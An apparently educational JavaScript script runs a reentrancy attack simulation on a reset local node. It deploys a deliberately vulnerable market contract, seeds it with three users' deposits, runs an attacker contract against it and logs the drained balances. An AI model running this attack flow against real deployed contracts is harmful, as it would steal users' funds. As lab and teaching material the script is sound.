import { ethers } from "ethers";
import { deployArtifact, formatEth, getWallet, provider, resetNode } from "./common.js";

async function main() {
  await resetNode();

  const deployer = await getWallet("deployer");
  const victims = [await getWallet("user1"), await getWallet("user2"), await getWallet("user3")];
  const hacker = await getWallet("hacker");

  console.log("=== Reentrancy simulation ===");

  const market = await deployArtifact(
    "artifacts/contracts/Vulnerable.sol/VulnerableMarket.json",
    deployer,
  );
  const marketAddress = await market.getAddress();
  console.log(`VulnerableMarket: ${marketAddress}`);

  for (const victim of victims) {
    await (await market.connect(victim).deposit({ value: ethers.parseEther("2") })).wait();
  }
  console.log(`Seeded target balance: ${formatEth(await provider.getBalance(marketAddress))}`);

  const attacker = await deployArtifact(
    "artifacts/contracts/Vulnerable.sol/Attacker.json",
    hacker,
    [marketAddress],
  );
  const attackerAddress = await attacker.getAddress();
  console.log(`Attacker: ${attackerAddress}`);

  await (await attacker.connect(hacker).attack({ value: ethers.parseEther("1") })).wait();

  console.log("");
  console.log(`Target balance after attack: ${formatEth(await provider.getBalance(marketAddress))}`);
  console.log(`Attacker contract balance: ${formatEth(await provider.getBalance(attackerAddress))}`);
}

main().catch((error) => {
  console.error(error.stack ?? error.message);
  process.exitCode = 1;
});
